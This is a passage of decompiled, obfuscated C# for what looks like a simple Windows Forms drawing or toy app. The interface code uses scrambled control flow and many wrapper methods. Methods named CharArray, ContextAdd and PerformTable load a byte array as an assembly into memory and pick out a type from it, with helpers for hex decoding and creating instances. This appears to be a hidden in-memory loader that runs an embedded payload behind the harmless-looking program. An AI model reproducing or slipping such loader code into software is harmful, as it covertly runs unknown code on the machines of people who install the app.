					num = ((int)num2 * -581627377) ^ 0x62E928B6;
					continue;
				case 15u:
					num = (int)((num2 * 1801981368) ^ 0xC982EA9);
					continue;
				case 14u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = (int)(num2 * 536663165) ^ -1693294499;
					continue;
				case 13u:
					num = ((int)num2 * -154312860) ^ -708053653;
					continue;
				case 12u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)((num2 * 1891477469) ^ 0x581CF9F);
					continue;
				case 11u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -2092526556) ^ 0x5D4DDB24;
					continue;
				case 10u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 2107061725) ^ -652807035;
					continue;
				case 9u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)(num2 * 1645602344) ^ -29428501;
					continue;
				case 8u:
					num = ((int)num2 * -1389823846) ^ 0x60D4BB01;
					continue;
				case 7u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)(num2 * 1662059365) ^ -1057524935;
					continue;
				case 6u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)((num2 * 197106485) ^ 0x4EB32D02);
					continue;
				case 5u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)((num2 * 2146456002) ^ 0x26DDF8D2);
					continue;
				case 4u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -34995573) ^ 0x1CB60508;
					continue;
				case 3u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -286016428) ^ 0x725241B0;
					continue;
				case 2u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -635611452) ^ 0x27AC8C5F;
					continue;
				case 1u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -531027679) ^ -1652572116;
					continue;
				case 0u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)((num2 * 476630868) ^ 0x67E9416B);
					continue;
				default:
					return;
				case 36u:
					break;
				case 24u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = -2007850780;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE9C18C3Eu) % 3u)
				{
				case 2u:
					goto IL_0009;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0009:
				PerformTable(q);
				num = (int)((num2 * 420874439) ^ 0x6F27D876);
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -523816012;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xFD7EAE34u) % 3u)
				{
				case 1u:
					goto IL_0003;
				case 2u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = Form1.smethod_94(Form1.smethod_93(), Position);
				num = (int)((num2 * 1484876249) ^ 0x1268C0E4);
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
